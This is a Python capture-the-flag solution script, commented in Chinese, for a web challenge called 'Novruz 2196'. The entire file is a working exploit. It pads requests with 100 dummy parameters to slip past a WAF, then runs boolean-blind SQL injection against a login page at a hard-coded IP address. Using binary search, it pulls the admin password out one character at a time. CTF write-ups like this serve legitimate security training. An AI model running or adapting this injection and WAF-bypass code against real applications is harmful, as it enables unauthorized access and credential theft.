#!/usr/bin/env python3
"""
题目名称: Novruz 2196
类别: Web (WAF Bypass + SQL 盲注)
解题思路:
    1. 登录接口存在 SQL 注入，但有 WAF 限制参数数量
    2. 通过添加 100 个填充参数绕过 WAF 检测
    3. 利用 UNION SELECT + CASE WHEN 进行布尔盲注
    4. 二分法逐字符提取 admin 密码（即 flag）
"""

import sys
import urllib.parse

import requests

# 目标地址（可通过命令行参数覆盖）
TARGET_URL = "http://95.111.234.103:10007/login.php"
# WAF 填充参数数量
WAF_PADDING_COUNT = 100


def build_payload(cond: str) -> str:
    """构造带 WAF 绕过填充的注入 payload"""
    params = [(f"p{i}", "x") for i in range(WAF_PADDING_COUNT)]
    injection = "' UNION SELECT CASE WHEN (" + cond + ") THEN 1 ELSE null END, 2-- "
    params.append(("name", injection))
    params.append(("password", "x"))
    return urllib.parse.urlencode(params)


def test_cond(cond: str, session: requests.Session, url: str = TARGET_URL) -> bool:
    """测试 SQL 条件是否为真（302 表示真）"""
    body = build_payload(cond)
    r = session.post(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False,
        timeout=10,
    )
    return r.status_code == 302


def extract_string(expr: str, session: requests.Session, url: str = TARGET_URL, max_len: int = 80) -> str:
    """二分法逐字符提取 SQL 表达式的值"""
    out = ""
    for pos in range(1, max_len + 1):
        if not test_cond(f"length({expr}) >= {pos}", session, url):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if test_cond(f"unicode(substr({expr},{pos},1)) > {mid}", session, url):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print(f"pos {pos}: {out}")
    return out


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    session = requests.Session()

    try:
        expr = "(select password from users where name='admin' limit 1)"
        flag = extract_string(expr, session, url, 80)
        print("flag:", flag)
    except requests.RequestException as e:
        print(f"[!] 请求失败: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
